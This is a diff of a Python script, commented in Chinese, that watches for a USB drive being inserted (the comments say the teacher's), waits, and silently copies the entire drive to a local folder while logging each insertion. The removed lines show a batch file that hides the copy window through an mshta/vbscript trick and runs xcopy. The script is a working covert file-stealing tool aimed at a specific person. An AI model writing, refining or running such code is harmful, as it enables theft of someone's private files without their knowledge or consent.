@@ -1,23 +1,14 @@
-#pip install psutil
-import psutil,os
-import time
+import psutil,shutil,os,time
 
-#新建文件夹以存放文件
+#读取配置文件
 dir=os.getcwd()
-try:
-    os.mkdir('files')
-except:
-    pass
-dir=dir+r'\files'
-os.chdir(dir)
-
-#获取配置信息(wait:等待时间)
-try:
-    with open('setting.txt','r') as f:
-        file=f.read()
-        wait=int(file)
-except:
-    wait=1 #默认等待时间
+from Setting import read_json
+auto_start,save_dir,wait_time=read_json()
+wait_time=int(wait_time)
+if save_dir=='':
+    os.mkdir('file')
+    save_dir=dir+r'\files'
+os.chdir(save_dir)
 
 #获取分区名
 def getname(copydir):
@@ -29,29 +20,12 @@ def getname(copydir):
     os.remove('temp.txt')
     try:
         os.chdir(dir)
-        os.mkdir(time.strftime("%H-%M-%S",time.localtime()))
-        dirname=time.strftime("%H-%M-%S",time.localtime())
     except:
         pass
-    return name,dirname
+    return name
+
 #获取磁盘信息
 old_disk=psutil.disk_partitions()
-
-#写一个bat隐藏复制时的窗口
-def cbat(copydir,dir):
-    bat=open('copy.bat','w',encoding='utf-8')
-    print('@echo off',file=bat)
-    print('if "%1"=="hide" goto CmdBegin',file=bat)
-    print('start mshta vbscript:createobject("wscript.shell").run("""%~0"" hide",0)(window.close)&&exit',file=bat)
-    print(':CmdBegin',file=bat)
-    print(' ',file=bat)
-    txtname=time.strftime("%H-%M-%S",time.localtime())+'.txt'
-    ml='xcopy '+copydir+' '+dir+' /E /H /R '
-    print(ml,file=bat)
-    ml='attrib -H '+dir+' -s'
-    print(ml,file=bat)
-    bat.close()
-    return txtname
 
 #日志模块
 class log:
@@ -59,9 +33,9 @@ class log:
         sen='[开始运行]'+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+'\n'
         with open('log.txt','a') as f:
             f.write(sen)
-    def New_Usb(disk_path,name,dirname):
-        sen0='[插入]'+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+': 有U盘插入，路径为'+disk_path
-        sen1='分区名: '+name+' 存放路径'+dirname+'\n'
+    def New_Usb(name,save_dir):
+        sen0='[插入]'+time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+': 有U盘插入'
+        sen1='分区名: '+name+' 存放路径'+save_dir+'\n'
         sen=[]
         sen.append(sen0)
         sen.append(sen1)
@@ -73,6 +47,7 @@ class log:
             f.write(sen)
 
 log.start()
+
 #循环检测是否老师插入U盘
 while True:
     new_disk=psutil.disk_partitions()
@@ -81,25 +56,23 @@ while True:
         for i in old_disk:
             new_disk.remove(i)
         print('开始复制...')
-        copydir=str(new_disk[0][0])
-        name,dirname=getname(copydir)
-        dir=dir+'\\'+dirname
-        log.New_Usb(disk_path=copydir,name=name,dirname=dirname)
-        time.sleep(wait) #建议10分钟后才开始复制，因为这是老师打开U盘的时候
-        print(dir)
-        txtname=cbat(copydir,dir)
-        os.system('copy.bat')
-        print('bat开始运行...')
+        copy_dir=str(new_disk[0][0])
+        name=getname(copy_dir)
+        save_dir=save_dir+'\\'+name
+        log.New_Usb(name=name,save_dir=save_dir)
+        time.sleep(wait_time) #建议10分钟后才开始复制，因为这是老师打开U盘的时候
+        print('复制目录: ',copy_dir)
+        print('存放目录: ',save_dir)
+        try:
+            shutil.copytree(copy_dir,save_dir,dirs_exist_ok=True)
+        except shutil.Error:
+            pass
         old_disk=psutil.disk_partitions()
     elif len(new_disk)<len(old_disk): #当前分区数变小时，就是老师拔出U盘的时候
         old_disk=psutil.disk_partitions()
-        try:
-            os.remove('copy.bat')
-        except:
-            pass
         print('waiting...')
         log.exit()
-        time.sleep(wait)
+        time.sleep(wait_time)
     else:
         print('waiting...')
-        time.sleep(wait)
+        time.sleep(wait_time)
